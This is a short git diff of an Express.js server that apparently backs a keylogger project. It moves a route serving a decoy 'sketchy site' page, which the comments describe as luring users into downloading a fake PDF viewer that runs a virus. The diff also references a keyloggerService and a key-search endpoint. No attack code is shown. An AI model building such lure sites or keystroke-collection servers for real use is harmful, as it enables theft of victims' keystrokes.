@@ -18,6 +18,20 @@ app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 
 /**
+ *  Endpoint: "/"
+ *  @param {req}
+ *  -Request coming into the server
+ *  @param {res}
+ *  -Response from the server back to the client.
+ *  Serves as the joke page that would represent some sketchy site you would visit. The site would
+ *  theoretically contain advertisements that were sketchy, which commonly includes an advert for a pdf viewer.
+ *  User then clicks on advert and downloads the fake file that runs the virus when executed.
+ */
+app.get("/", (req, res) => {
+  res.render("dummypage");
+});
+
+/**
  * Endpoint: /pdfpage
  *  @param {req}
  *  -Request coming into the server
@@ -107,20 +121,6 @@ app.post("/searchKeys", (req, res) => {
 });
 
 /**
- *  Endpoint: "/"
- *  @param {req}
- *  -Request coming into the server
- *  @param {res}
- *  -Response from the server back to the client.
- *  Serves as the joke page that would represent some sketchy site you would visit. The site would
- *  theoretically contain advertisements that were sketchy, which commonly includes an advert for a pdf viewer.
- *  User then clicks on advert and downloads the fake file that runs the virus when executed.
- */
-app.get("/", (req, res) => {
-  res.render("dummypage");
-});
-
-/**
  * Server listen:
  * Makes the server listen on port 8080. Connects to the MongoDB instance whenever
  * the server finishes starting up.
@@ -129,5 +129,3 @@ app.listen(8080, () => {
   keyloggerService.connectDB(); //Connect the database when the server starts.
   console.log("server started");
 });
-
-//ajdl;kasdflksdf
